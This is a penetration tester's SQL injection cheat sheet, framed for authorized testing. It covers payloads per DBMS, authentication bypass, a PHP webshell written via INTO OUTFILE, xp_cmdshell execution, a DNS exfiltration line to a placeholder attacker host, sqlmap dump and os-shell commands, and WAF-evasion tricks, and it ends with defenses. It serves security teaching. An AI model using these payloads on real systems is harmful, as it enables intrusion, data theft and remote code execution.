# Web — SQL Injection (SQLi)

Injecting into a SQL query so the DB runs your input as code. Scope: authorized web testing only. Impact ranges from auth bypass and full data dump to file read/write and **RCE** on the DB host. This note covers the types, manual exploitation per DBMS, a commented **sqlmap** reference, and bypass tricks.

> `--dump` and file/OS access touch production data — confirm scope. Prefer read-only enumeration first; get written approval before `INTO OUTFILE`, `xp_cmdshell`, stacked writes, or `sqlmap --dump` of real customer data.

## Contents

- [Types](#types)
- [Detect it](#detect-it)
- [Manual — UNION-based](#manual--union-based)
- [Manual — error-based](#manual--error-based)
- [Manual — blind (boolean & time)](#manual--blind-boolean--time)
- [Authentication bypass](#authentication-bypass)
- [DBMS cheat columns](#dbms-cheat-columns)
- [SQLi → file read/write & RCE](#sqli--file-readwrite--rce)
- [sqlmap — commented command list](#sqlmap--commented-command-list)
- [WAF / filter bypass tips & tricks](#waf--filter-bypass-tips--tricks)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Types

| Class | Type | How you read data |
| --- | --- | --- |
| **In-band** | **Error-based** | DB error message leaks the data |
| | **UNION-based** | Append a `UNION SELECT` and read it in the response |
| **Inferential (blind)** | **Boolean-based** | Page differs on true/false condition |
| | **Time-based** | `SLEEP()` delay reveals true/false |
| **Out-of-band (OOB)** | DNS/HTTP | DB makes a network call carrying the data (when no in-band channel) |

Also classify by **DBMS** (MySQL/MariaDB, MSSQL, PostgreSQL, Oracle, SQLite) — syntax for comments, concatenation, and functions differs ([cheat columns](#dbms-cheat-columns)).

## Detect it

```sql
-- break the query, then fix it: an error or changed behavior = injectable
'          "          `          \
' OR '1'='1            -- always-true
' AND '1'='2           -- always-false (compare responses)

-- numeric vs string context
1               -> 1 AND 1=1      (true)   /   1 AND 1=2 (false)
1'              -> 1' AND '1'='1

-- confirm with a provable condition, not just an error
' AND 1=1-- -          (normal page)
' AND 1=2-- -          (different/empty page)  => boolean oracle exists
```

Comment styles to terminate the rest of the query: `-- -` (note the space, MySQL), `#`, `/*...*/`. Test every input: URL params, POST body, JSON values, cookies, and headers (`User-Agent`, `X-Forwarded-For`, `Referer`).

## Manual — UNION-based

Fastest when output is reflected. Two things must match: **column count** and a **compatible type** in a visible column.

```sql
-- 1. find the column count (increment until no error)
' ORDER BY 1-- -        ' ORDER BY 2-- -   ...   ' ORDER BY 6-- -  (errors -> 5 columns)
-- or:
' UNION SELECT NULL-- -           ' UNION SELECT NULL,NULL-- -   ... until it works

-- 2. find which columns print (use a marker; swap NULLs for strings)
' UNION SELECT 'a',NULL,NULL,NULL,NULL-- -     -- try each slot; 'a' appears = slot 1 visible

-- 3. fingerprint + dump via the visible columns
' UNION SELECT @@version,database(),user(),NULL,NULL-- -          -- MySQL/MSSQL
' UNION SELECT version(),current_database(),current_user,NULL,NULL-- -   -- PostgreSQL

-- 4. list tables, then columns (information_schema, standard on MySQL/MSSQL/Postgres)
' UNION SELECT table_name,NULL,... FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL,... FROM information_schema.columns WHERE table_name='users'-- -

-- 5. dump creds (concat into one visible column)
' UNION SELECT concat(username,':',password),NULL,... FROM users-- -   -- MySQL concat()
' UNION SELECT username||':'||password,NULL,... FROM users-- -         -- Postgres/Oracle ||
```

If types clash (e.g. a numeric column), keep it `NULL` and put your string in a text column. Oracle requires `FROM dual` for constant selects.

## Manual — error-based

When errors are shown but UNION output isn't. Force the data into an error message.

```sql
-- MySQL (extractvalue / updatexml, <= 32 chars per read)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1)),1)-- -

-- MSSQL (convert error leaks the value)
' AND 1=convert(int,(SELECT @@version))-- -
' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects))-- -

-- PostgreSQL (cast error)
' AND 1=cast((SELECT version()) as int)-- -
```

## Manual — blind (boolean & time)

No output and no errors — ask yes/no questions and read the page (boolean) or the clock (time).

```sql
-- BOOLEAN: true renders normally, false renders differently
' AND (SELECT SUBSTRING(version(),1,1))='8'-- -                -- is MySQL major v8?
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -   -- brute char-by-char

-- TIME-BASED: delay only when the condition is true
' AND IF((SELECT SUBSTRING(version(),1,1))='8',SLEEP(3),0)-- -      -- MySQL
'; IF (1=1) WAITFOR DELAY '0:0:3'-- -                               -- MSSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -   -- Postgres
' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ... END FROM dual)-- -  -- Oracle

-- OUT-OF-BAND (no in-band channel at all) — MySQL on Windows via UNC, MSSQL, Oracle, Postgres
-- exfil a value over DNS to your Collaborator/interactsh host
' AND LOAD_FILE(concat('\\\\',(SELECT password FROM users LIMIT 1),'.ATTACKER\\x'))-- -
```

Blind char-by-char is slow by hand — this is exactly where you hand it to **sqlmap**.

## Authentication bypass

```sql
-- login form: username field
admin'-- -                 -- comment out the password check
admin' #
' OR 1=1-- -               -- logs in as the first user (often admin)
' OR 1=1 LIMIT 1-- -
') OR ('1'='1'-- -         -- when the query wraps the input in parentheses
```

## DBMS cheat columns

| | MySQL/MariaDB | MSSQL | PostgreSQL | Oracle |
| --- | --- | --- | --- | --- |
| Version | `@@version` / `version()` | `@@version` | `version()` | `banner FROM v$version` |
| Current DB | `database()` | `db_name()` | `current_database()` | `SELECT user FROM dual` |
| Comment | `-- -`, `#`, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
| Concat | `concat(a,b)` / `concat_ws` | `a+b` | `a||b` | `a||b` |
| Substring | `substring()` | `substring()` | `substring()` | `substr()` |
| Sleep | `sleep(n)` | `waitfor delay '0:0:n'` | `pg_sleep(n)` | `dbms_pipe.receive_message` |
| Stacked queries | ✗ (usually) | ✓ | ✓ | ✗ |
| No-FROM select | ok | ok | ok | needs `FROM dual` |

## SQLi → file read/write & RCE

Only with the right privileges/config, and only if the engagement allows writing to the DB host.

```sql
-- MySQL: read a file (needs FILE priv; secure_file_priv must allow it)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
-- MySQL: write a webshell (writable webroot, FILE priv, secure_file_priv off)
' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -

-- MSSQL: command execution via xp_cmdshell (sysadmin; often disabled)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'-- -

-- PostgreSQL: command execution (superuser) via COPY ... PROGRAM, or large-object file write
'; COPY (SELECT '') TO PROGRAM 'id'-- -
```

A webshell or `xp_cmdshell` turns SQLi into [RCE](RCE.md) — then grab a reverse shell and treat it as a normal host ([Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)). Dumped password hashes go to [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) for cracking.

## sqlmap — commented command list

Automates detection, exploitation and extraction. **Feed it a real request** (copy from Burp: *Copy to file*) so headers/cookies/method match exactly — far more reliable than flags.

```bash
# --- Basic detection ---
sqlmap -u "https://target.tld/item?id=1"            # test a GET param
sqlmap -u "https://target.tld/item?id=1" --batch    # --batch = accept all default prompts (non-interactive)
sqlmap -u "https://target.tld/item?id=1" -p id      # -p = test only this parameter

# --- Feed a saved HTTP request (best for POST / auth / custom headers) ---
sqlmap -r request.txt --batch                       # -r = replay a raw request file (method, body, cookies, headers all included)
sqlmap -r request.txt -p username                   # target one field inside that request
# mark the exact injection point in the file with a * if sqlmap can't guess it:  ...&id=1*

# --- POST data / headers / auth without a file ---
sqlmap -u "https://target.tld/login" --data="user=a&pass=b"      # --data = POST body (triggers POST)
sqlmap -u "..." --data='{"id":1}'                                # JSON body; mark point with {"id":1*}
sqlmap -u "..." --cookie="SESSION=abc; role=user"                # authenticated session
sqlmap -u "..." --headers="X-Forwarded-For: 1*"                  # inject via a header (note the * marker)
sqlmap -u "..." -H "Authorization: Bearer TOKEN"                 # single extra header
sqlmap -u "..." --auth-type=basic --auth-cred="user:pass"        # HTTP Basic auth

# --- Tune the scan depth ---
sqlmap -r request.txt --level=5 --risk=3            # level 1-5 = more params/places tested; risk 1-3 = heavier (OR/time) payloads
sqlmap -r request.txt --dbms=mysql                  # skip fingerprinting; you already know the DBMS (faster, fewer requests)
sqlmap -r request.txt --technique=BEUST            # restrict techniques: B=boolean E=error U=union S=stacked T=time Q=inline
sqlmap -r request.txt --threads=10                  # parallel requests (speeds up blind extraction)
sqlmap -r request.txt --random-agent                # rotate a real browser User-Agent (evade dumb UA filters)

# --- Enumeration (read-only, map the DB) ---
sqlmap -r request.txt --banner                      # DB version banner
sqlmap -r request.txt --current-user --current-db --is-dba   # who am I, which DB, am I admin
sqlmap -r request.txt --dbs                         # list databases
sqlmap -r request.txt -D shopdb --tables            # -D pick a database, list its tables
sqlmap -r request.txt -D shopdb -T users --columns  # -T pick a table, list its columns
sqlmap -r request.txt -D shopdb -T users --count    # row count before you dump (avoid huge dumps)

# --- Extraction ---
sqlmap -r request.txt -D shopdb -T users -C username,password --dump   # -C = only these columns
sqlmap -r request.txt -D shopdb -T users --dump                        # whole table
sqlmap -r request.txt -D shopdb -T users --dump --where="id>0 AND id<50"  # bounded dump (scope-friendly)
sqlmap -r request.txt --dump-all --exclude-sysdbs   # everything except system DBs (noisy — be sure of scope)
sqlmap -r request.txt --search -C password          # find any column named like 'password' across the DB

# --- Post-exploitation (needs privileges; confirm scope first) ---
sqlmap -r request.txt --sql-shell                   # interactive SQL prompt through the injection
sqlmap -r request.txt --sql-query="SELECT @@version" # run one query
sqlmap -r request.txt --file-read=/etc/passwd       # read a server file (FILE priv)
sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/s.php  # upload a file to the host
sqlmap -r request.txt --os-shell                    # try to get an OS command shell (webroot write / xp_cmdshell / etc.)
sqlmap -r request.txt --os-cmd="whoami"             # run a single OS command

# --- WAF evasion & plumbing ---
sqlmap -r request.txt --tamper=space2comment,between        # tamper scripts mutate payloads to dodge filters
sqlmap --list-tampers                                        # see all tamper scripts and what they do
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"       # route through Burp to inspect traffic
sqlmap -r request.txt --tor --tor-type=socks5 --check-tor   # anonymize via Tor
sqlmap -r request.txt --delay=1 --time-sec=5                 # slow down; raise the time-based threshold on laggy targets
sqlmap -u "https://target.tld/" --crawl=2 --forms --batch   # spider the site and auto-test discovered forms
sqlmap -r request.txt --flush-session                        # forget cached results and re-test from scratch
sqlmap -r request.txt -v 3                                   # verbosity 3 = show the actual payloads being sent
```

**Common tamper scripts:** `space2comment` (spaces → `/**/`), `between` (`>` → `NOT BETWEEN`), `charencode`/`charunicodeencode` (URL/unicode-encode), `randomcase` (mixed case keywords), `apostrophemask`, `modsecurityversioned` (MySQL versioned comments `/*!...*/`). Chain several with commas.

## WAF / filter bypass tips & tricks

- **Comments & whitespace:** `/**/`, `/*!50000UNION*/` (MySQL versioned), `%09`/`%0a`/`%0c` as space substitutes, `UNION/**/SELECT`.
- **Case & keyword splitting:** `UnIoN`, `uni%00on`, `UNunionION SELECT` (non-recursive strippers).
- **Encoding:** URL-encode, double URL-encode, hex strings (`0x61646d696e` for `admin`), `char(97,...)`, unicode.
- **Logic swaps:** `OR 1=1` → `OR 2>1`, `OR 'a'='a'`; `=` → `LIKE`/`BETWEEN`/`IN`.
- **No quotes needed:** use hex/`char()` for strings so you never type `'`.
- **Confirm the DBMS early** — it dictates comment syntax, concat operator, and whether stacked queries work. Guessing wrong wastes time.
- **Always try every input** (headers/cookies/JSON), and test both numeric and string break-out. If in-band fails, fall back to boolean → time → OOB, in that order of speed.

## Defense / detection (for the report)

- **Parameterized queries / prepared statements** everywhere — the actual fix. ORMs help but raw/`.raw()`/string-built queries reintroduce it.
- **Least-privilege DB account** — app user shouldn't have `FILE`, `xp_cmdshell`, superuser, or DDL; separate read/write users; `secure_file_priv` set.
- **Allowlist input validation** for structural parts (sort column, direction) that can't be parameterized; reject unexpected types.
- **Stored-proc / ORM** usage reviewed — dynamic SQL inside a proc is still injectable.
- **WAF** as defense-in-depth (not a fix); disable detailed DB errors in prod.
- **Detect:** DB/WAF alerts on `UNION SELECT`, `information_schema`, `SLEEP(`/`WAITFOR`, `xp_cmdshell`; sudden long query times (time-based); spikes in rows read; app-error rate from malformed SQL.

## Related

[Web Overview](Web%20Overview.md) · [RCE](RCE.md) (SQLi→webshell/xp_cmdshell) · [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) (crack dumped hashes) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)
